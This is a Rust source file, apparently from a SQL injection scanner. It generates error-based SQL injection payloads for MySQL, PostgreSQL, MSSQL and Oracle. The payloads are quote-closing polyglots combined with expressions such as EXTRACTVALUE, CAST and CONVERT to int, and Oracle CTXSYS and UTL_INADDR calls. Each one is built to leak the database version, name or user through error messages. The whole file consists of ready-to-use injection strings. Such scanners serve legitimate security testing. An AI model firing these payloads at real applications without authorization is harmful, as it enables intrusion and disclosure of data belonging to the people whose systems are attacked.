#![deny(unsafe_code)]

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct ErrorPayload {
    pub payload: String,
    pub dbms: String,
}

/// P0-1 head polyglots: `'"()))` closes `'`, `"` and `()))` at once, the
/// mirrored `"'()))` covers double-quote-dominant contexts. Numeric (`1 AND …`,
/// no leading quote) covers integer parameters since payloads replace the
/// parameter value. Historical `' AND …` payloads keep their relative order
/// right after the polyglots so L1 (`budget(level, 2, …)`) stays compatible.
#[must_use]
pub fn error_payloads_for(dbms: Option<&str>) -> Vec<ErrorPayload> {
    const POLY_SINGLE: &str = "'\"()))";
    const POLY_DOUBLE: &str = "\"'()))";
    let list: Vec<(String, &str)> = match dbms {
        Some("mysql") => {
            let core0 = "AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) -- -".to_owned();
            let core1 = "AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -"
                .to_owned();
            vec![
                (format!("{POLY_SINGLE} {core0}"), "mysql"),
                (format!("{POLY_DOUBLE} {core0}"), "mysql"),
                (format!("' {core0}"), "mysql"),
                (format!("' {core1}"), "mysql"),
                (format!("1 {core0}"), "mysql"),
            ]
        }
        Some("postgres") => {
            let core0 = "AND CAST((SELECT version()) AS int) --".to_owned();
            let core1 = "AND 1=CAST((SELECT current_database()) AS int) --".to_owned();
            vec![
                (format!("{POLY_SINGLE} {core0}"), "postgres"),
                (format!("{POLY_DOUBLE} {core0}"), "postgres"),
                (format!("' {core0}"), "postgres"),
                (format!("' {core1}"), "postgres"),
                (format!("1 {core0}"), "postgres"),
            ]
        }
        Some("mssql") => {
            let core0 = "AND CONVERT(int,@@version) --".to_owned();
            let core1 = "AND 1=CONVERT(int,DB_NAME()) --".to_owned();
            vec![
                (format!("{POLY_SINGLE} {core0}"), "mssql"),
                (format!("{POLY_DOUBLE} {core0}"), "mssql"),
                (format!("' {core0}"), "mssql"),
                (format!("' {core1}"), "mssql"),
                (format!("1 {core0}"), "mssql"),
            ]
        }
        Some("oracle") => {
            let core0 = "AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --"
                .to_owned();
            let core1 = "AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)) --".to_owned();
            vec![
                (format!("{POLY_SINGLE} {core0}"), "oracle"),
                (format!("{POLY_DOUBLE} {core0}"), "oracle"),
                (format!("' {core0}"), "oracle"),
                (format!("' {core1}"), "oracle"),
                (format!("1 {core0}"), "oracle"),
            ]
        }
        _ => {
            let mysql_sample = "AND EXTRACTVALUE(1,CONCAT(0x7e,@@version)) -- -".to_owned();
            let pg = "AND CAST((SELECT version()) AS int) --".to_owned();
            let ms = "AND CONVERT(int,@@version) --".to_owned();
            vec![
                (format!("{POLY_SINGLE} {mysql_sample}"), "mysql"),
                (format!("{POLY_DOUBLE} {mysql_sample}"), "mysql"),
                (format!("' {mysql_sample}"), "mysql"),
                (format!("' {pg}"), "postgres"),
                (format!("' {ms}"), "mssql"),
                (format!("1 {mysql_sample}"), "mysql"),
            ]
        }
    };
    list.into_iter()
        .map(|(p, d)| ErrorPayload {
            payload: p,
            dbms: d.to_owned(),
        })
        .collect()
}
